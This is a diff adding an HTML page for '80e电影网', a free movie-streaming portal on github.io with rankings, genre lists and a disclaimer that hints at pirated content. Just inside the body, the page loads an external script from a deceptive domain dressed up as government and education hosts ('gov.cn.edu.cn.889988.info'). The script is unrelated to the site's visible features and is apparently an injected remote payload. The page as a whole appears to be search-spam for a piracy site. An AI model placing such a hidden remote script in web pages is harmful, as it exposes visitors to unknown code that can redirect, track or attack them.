@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>80e电影网 - 高清影视在线观看 | 80edianyingwang-zh.github.io</title>
+<meta name="description" content="80e电影网（80edianyingwang-zh.github.io）为您提供最新高清电影、热门电视剧、综艺动漫在线观看与免费下载。涵盖动作、喜剧、爱情、科幻、悬疑等多种类型，每日更新，极速播放，畅享优质影视体验。">
+<meta name="keywords" content="80e电影网,80edianyingwang-zh.github.io,电影在线观看,电视剧免费看,高清电影,最新电影,热门影视,电影资源">
+<meta name="author" content="80e电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<meta name="theme-color" content="#0f1923">
+<link rel="canonical" href="https://80edianyingwang-zh.github.io">
+<style>
+:root{
+  --bg:#0b1118;--panel:#121c27;--line:#1e2c3a;--txt:#e8eef4;--sub:#93a4b6;
+  --acc:#ff7a45;--acc2:#22d3ee;--rad:14px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.7;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1160px;margin:0 auto;padding:0 18px}
+
+/* top */
+.topbar{position:sticky;top:0;z-index:50;background:rgba(11,17,24,.86);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.top{display:flex;align-items:center;gap:14px;height:60px}
+.logo{font-size:19px;font-weight:800;letter-spacing:.5px;white-space:nowrap}
+.logo b{color:var(--acc)}
+.nav{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap}
+.nav a{padding:7px 12px;border-radius:9px;font-size:14px;color:var(--sub);transition:.2s}
+.nav a:hover{background:var(--panel);color:var(--txt)}
+.mnav{display:none;background:none;border:0;color:var(--txt);font-size:24px;cursor:pointer;margin-left:auto}
+
+/* hero */
+.hero{position:relative;padding:64px 0 54px;overflow:hidden}
+.hero:after{content:"";position:absolute;right:-120px;top:-80px;width:420px;height:420px;
+  background:radial-gradient(circle,rgba(255,122,69,.28),transparent 70%);z-index:0}
+.hero-in{position:relative;z-index:1;max-width:720px}
+.tag{display:inline-block;font-size:12px;letter-spacing:2px;color:var(--acc2);border:1px solid rgba(34,211,238,.4);padding:5px 12px;border-radius:99px;margin-bottom:18px}
+.hero h1{font-size:40px;line-height:1.2;margin-bottom:14px;font-weight:800}
+.hero h1 em{font-style:normal;color:var(--acc);text-decoration:underline;text-decoration-color:rgba(255,122,69,.4);text-underline-offset:6px}
+.hero p{color:var(--sub);font-size:16px;max-width:600px}
+.search{margin-top:26px;display:flex;gap:8px;flex-wrap:wrap;max-width:560px}
+.search input{flex:1;min-width:200px;padding:13px 16px;border-radius:11px;border:1px solid var(--line);background:var(--panel);color:var(--txt);font-size:15px;outline:none}
+.search input:focus{border-color:var(--acc)}
+.search button{padding:13px 22px;border:0;border-radius:11px;background:var(--acc);color:#fff;font-size:15px;font-weight:700;cursor:pointer}
+.stats{display:flex;gap:26px;margin-top:34px;flex-wrap:wrap}
+.stats div span{display:block;font-size:24px;font-weight:800;color:var(--acc2)}
+.stats div small{color:var(--sub);font-size:12px}
+
+/* section */
+.sec{padding:46px 0}
+.sec-h{display:flex;align-items:flex-end;gap:12px;margin-bottom:22px;flex-wrap:wrap}
+.sec-h h2{font-size:23px;font-weight:800}
+.sec-h h2 i{font-style:normal;color:var(--acc)}
+.sec-h a{margin-left:auto;font-size:13px;color:var(--sub);border:1px solid var(--line);padding:5px 12px;border-radius:99px}
+.grid{display:grid;gap:16px}
+.g4{grid-template-columns:repeat(4,1fr)}
+.g3{grid-template-columns:repeat(3,1fr)}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:var(--rad);overflow:hidden;transition:.25s}
+.card:hover{transform:translateY(-5px);border-color:rgba(255,122,69,.5)}
+.thumb{position:relative;aspect-ratio:3/4;background:linear-gradient(135deg,#1a2a3a,#0f1923)}
+.thumb:after{content:attr(data-t);position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
+  font-size:15px;color:#c3d0dd;text-align:center;padding:14px;font-weight:600}
+.badge{position:absolute;top:9px;left:9px;background:rgba(0,0,0,.65);color:#fff;font-size:11px;padding:3px 8px;border-radius:6px;backdrop-filter:blur(4px)}
+.score{position:absolute;top:9px;right:9px;background:var(--acc);color:#fff;font-size:12px;font-weight:800;padding:3px 8px;border-radius:6px}
+.info{padding:11px 12px}
+.info h3{font-size:14.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.info p{font-size:12px;color:var(--sub);margin-top:4px}
+
+/* types */
+.chips{display:flex;gap:9px;flex-wrap:wrap}
+.chip{padding:9px 16px;border-radius:10px;background:var(--panel);border:1px solid var(--line);font-size:14px;cursor:pointer;transition:.2s}
+.chip:hover{border-color:var(--acc2);color:var(--acc2)}
+.chip.on{background:var(--acc);border-color:var(--acc);color:#fff}
+
+/* news list */
+.lst{display:flex;flex-direction:column;gap:12px}
+.lst a{display:flex;gap:12px;padding:14px;background:var(--panel);border:1px solid var(--line);border-radius:12px;transition:.2s}
+.lst a:hover{border-color:rgba(34,211,238,.5)}
+.lst .no{font-size:20px;font-weight:800;color:var(--line);min-width:34px}
+.lst .tx{flex:1;min-width:0}
+.lst .tx h4{font-size:15px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.lst .tx small{color:var(--sub);font-size:12px}
+.lst .tag2{font-size:11px;color:var(--acc);border:1px solid rgba(255,122,69,.4);padding:2px 7px;border-radius:5px;white-space:nowrap;align-self:center}
+
+/* about */
+.about{background:linear-gradient(180deg,transparent,var(--panel))}
+.about-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:26px}
+.box{background:var(--panel);border:1px solid var(--line);border-radius:var(--rad);padding:22px}
+.box h3{font-size:17px;margin-bottom:12px;color:var(--acc2)}
+.box p,.box li{color:var(--sub);font-size:14.5px}
+.box ul{list-style:none;display:flex;flex-direction:column;gap:9px}
+.box li:before{content:"▹";color:var(--acc);margin-right:7px}
+.linkbar{display:flex;flex-wrap:wrap;gap:9px;margin-top:6px}
+.linkbar a{font-size:13px;color:var(--sub);border:1px solid var(--line);padding:6px 11px;border-radius:8px}
+.linkbar a:hover{color:var(--acc);border-color:var(--acc)}
+
+/* footer */
+.foot{border-top:1px solid var(--line);padding:34px 0 26px;text-align:center;color:var(--sub);font-size:13px}
+.foot .site{font-size:16px;font-weight:800;color:var(--txt);margin-bottom:8px}
+.foot .site b{color:var(--acc)}
+.foot nav{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;margin:14px 0}
+.foot nav a{color:var(--sub);font-size:13px}
+.foot nav a:hover{color:var(--txt)}
+
+/* mobile */
+@media(max-width:860px){
+  .g4{grid-template-columns:repeat(2,1fr)}
+  .g3{grid-template-columns:repeat(2,1fr)}
+  .about-grid{grid-template-columns:1fr}
+  .hero h1{font-size:29px}
+}
+@media(max-width:640px){
+  .mnav{display:block}
+  .nav{display:none;position:absolute;left:0;right:0;top:60px;background:var(--panel);border-bottom:1px solid var(--line);
+    flex-direction:column;padding:10px;margin:0}
+  .nav.open{display:flex}
+  .nav a{width:100%;text-align:center}
+  .hero{padding:38px 0 32px}
+  .g3{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="topbar">
+  <div class="wrap top">
+    <div class="logo">80e<b>电影网</b></div>
+    <button class="mnav" id="mnav" aria-label="菜单">☰</button>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#hot">热播榜</a>
+      <a href="#type">影视分类</a>
+      <a href="#news">影讯资讯</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero" id="home">
+  <div class="wrap hero-in">
+    <span class="tag">80E DIANYING WANG · 在线影视门户</span>
+    <h1>80e电影网 · <em>高清影视</em>免费在线观看</h1>
+    <p>80e电影网（https://80edianyingwang-zh.github.io）是一个专注于高清影视在线播放的网站，聚合最新院线电影、热播电视剧、综艺与动漫资源，支持多线路极速播放，手机电脑均可流畅观看。</p>
+    <form class="search" onsubmit="return false">
+      <input type="search" placeholder="搜索电影 / 电视剧 / 演员名称">
+      <button type="submit">立即搜索</button>
+    </form>
+    <div class="stats">
+      <div><span>12,860+</span><small>影视资源</small></div>
+      <div><span>每日更新</span><small>内容同步</small></div>
+      <div><span>99.8%</span><small>播放流畅度</small></div>
+      <div><span>多端适配</span><small>手机 / PC</small></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="hot">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2>热播<span><i>排行榜</i></span></h2>
+      <a href="#">查看完整榜单</a>
+    </div>
+    <div class="grid g4">
+      <div class="card"><div class="thumb" data-t="热播电影封面"><span class="badge">电影</span><span class="score">9.2</span></div><div class="info"><h3>热播影片 · 巡回演出</h3><p>2026 · 剧情 / 音乐</p></div></div>
+      <div class="card"><div class="thumb" data-t="热播电影封面"><span class="badge">电影</span><span class="score">8.7</span></div><div class="info"><h3>边境行动 · 无界追凶</h3><p>2026 · 动作 / 犯罪</p></div></div>
+      <div class="card"><div class="thumb" data-t="热播剧集封面"><span class="badge">电视剧</span><span class="score">9.0</span></div><div class="info"><h3>长安二十四时</h3><p>36集全 · 古装 / 悬疑</p></div></div>
+      <div class="card"><div class="thumb" data-t="热播剧集封面"><span class="badge">电视剧</span><span class="score">8.5</span></div><div class="info"><h3>南风知我意</h3><p>28集全 · 都市 / 爱情</p></div></div>
+      <div class="card"><div class="thumb" data-t="热播综艺封面"><span class="badge">综艺</span><span class="score">8.8</span></div><div class="info"><h3>出发吧！旅行家</h3><p>更新至第10期 · 真人秀</p></div></div>
+      <div class="card"><div class="thumb" data-t="热播动漫封面"><span class="badge">动漫</span><span class="score">9.4</span></div><div class="info"><h3>灵境修仙传</h3><p>更新至第42集 · 国漫</p></div></div>
+      <div class="card"><div class="thumb" data-t="热播电影封面"><span class="badge">电影</span><span class="score">7.9</span></div><div class="info"><h3>深海谜踪 · 重启</h3><p>2026 · 科幻 / 冒险</p></div></div>
+      <div class="card"><div class="thumb" data-t="热播电影封面"><span class="badge">电影</span><span class="score">8.3</span></div><div class="info"><h3>春日慢递</h3><p>2026 · 爱情 / 治愈</p></div></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="type" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-h"><h2>影视<span><i>分类</i></span>频道</h2></div>
+    <div class="chips" style="margin-bottom:20px">
+      <span class="chip on">全部</span><span class="chip">动作</span><span class="chip">喜剧</span><span class="chip">爱情</span>
+      <span class="chip">科幻</span><span class="chip">悬疑</span><span class="chip">恐怖</span><span class="chip">动画</span>
+      <span class="chip">纪录片</span><span class="chip">战争</span>
+    </div>
+    <div class="grid g3">
+      <div class="card"><div class="thumb" data-t="动作 / 犯罪"><span class="badge">动作片</span></div><div class="info"><h3>硬核动作 · 高能打斗合集</h3><p>126 部影片</p></div></div>
+      <div class="card"><div class="thumb" data-t="喜剧 / 搞笑"><span class="badge">喜剧片</span></div><div class="info"><h3>爆笑喜剧 · 轻松解压</h3><p>98 部影片</p></div></div>
+      <div class="card"><div class="thumb" data-t="爱情 / 青春"><span class="badge">爱情片</span></div><div class="info"><h3>浪漫爱情 · 心动瞬间</h3><p>87 部影片</p></div></div>
+      <div class="card"><div class="thumb" data-t="科幻 / 未来"><span class="badge">科幻片</span></div><div class="info"><h3>科幻视界 · 脑洞大开</h3><p>64 部影片</p></div></div>
+      <div class="card"><div class="thumb" data-t="悬疑 / 反转"><span class="badge">悬疑片</span></div><div class="info"><h3>烧脑悬疑 · 层层反转</h3><p>71 部影片</p></div></div>
+      <div class="card"><div class="thumb" data-t="恐怖 / 惊悚"><span class="badge">恐怖片</span></div><div class="info"><h3>惊悚恐怖 · 午夜慎入</h3><p>53 部影片</p></div></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="news" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-h"><h2>影讯<span><i>资讯</i></span></h2><a href="#">更多资讯</a></div>
+    <div class="lst">
+      <a href="#"><span class="no">01</span><span class="tx"><h4>80e电影网片单更新：本周值得一看的 10 部新片</h4><small>2026-10-22 · 片单推荐</small></span><span class="tag2">推荐</span></a>
+      <a href="#"><span class="no">02</span><span class="tx"><h4>2026 国庆档票房回顾：哪部电影最让你惊喜？</h4><small>2026-10-20 · 行业观察</small></span><span class="tag2">热点</span></a>
+      <a href="#"><span class="no">03</span><span class="tx"><h4>经典重温｜这些高分老片至今仍被奉为神作</h4><small>2026-10-18 · 经典回顾</small></span><span class="tag2">经典</span></a>
+      <a href="#"><span class="no">04</span><span class="tx"><h4>观影指南：不同心情下该选什么类型的电影</h4><small>2026-10-15 · 观影指南</small></span><span class="tag2">指南</span></a>
+      <a href="#"><span class="no">05</span><span class="tx"><h4>演技封神！这些演员的银幕角色难以超越</h4><small>2026-10-12 · 人物专题</small></span><span class="tag2">专题</span></a>
+    </div>
+  </div>
+</section>
+
+<section class="sec about" id="about" style="padding-bottom:60px">
+  <div class="wrap about-grid">
+    <div class="box">
+      <h3>关于 80e电影网</h3>
+      <p style="margin-bottom:12px">80e电影网（网站网址：<strong style="color:var(--txt)">https://80edianyingwang-zh.github.io</strong>）致力于为用户提供简洁、流畅、高清的影视在线观看体验。本站界面针对移动端深度适配，无论在手机、平板还是电脑上，都能获得一致的浏览与播放体验。</p>
+      <ul>
+        <li>海量资源：覆盖电影、电视剧、综艺、动漫四大频道</li>
+        <li>极速播放：多线路智能切换，告别卡顿与等待</li>
+        <li>每日更新：同步院线、卫视与网络平台最新内容</li>
+        <li>干净界面：无弹窗干扰，专注观影本身</li>
+      </ul>
+    </div>
+    <div class="box">
+      <h3>网站导航</h3>
+      <div class="linkbar">
+        <a href="#home">网站首页</a><a href="#hot">热播榜单</a><a href="#type">影视分类</a>
+        <a href="#news">影讯资讯</a><a href="#about">关于本站</a><a href="#">电影大全</a>
+        <a href="#">电视剧集</a><a href="#">综艺节目</a><a href="#">动漫番剧</a>
+      </div>
+      <p style="margin-top:16px">友情提示：本网站内容来源于网络公开资源，仅供交流学习使用，请于下载或观看后 24 小时内删除，支持正版影视。</p>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="site">80e<b>电影网</b> · https://80edianyingwang-zh.github.io</div>
+    <nav>
+      <a href="#home">首页</a><a href="#hot">热播榜</a><a href="#type">分类</a>
+      <a href="#news">资讯</a><a href="#about">关于</a>
+    </nav>
+    <p>© 2026 80e电影网 版权所有 · 网站名称：80e电影网 · 网站网址：https://80edianyingwang-zh.github.io</p>
+  </div>
+</footer>
+
+<script>
+document.getElementById('mnav').addEventListener('click',function(){
+  document.getElementById('nav').classList.toggle('open');
+});
+document.querySelectorAll('.chip').forEach(function(c){
+  c.addEventListener('click',function(){
+    document.querySelectorAll('.chip').forEach(function(x){x.classList.remove('on')});
+    c.classList.add('on');
+  });
+});
+</script>
+</body>
+</html>
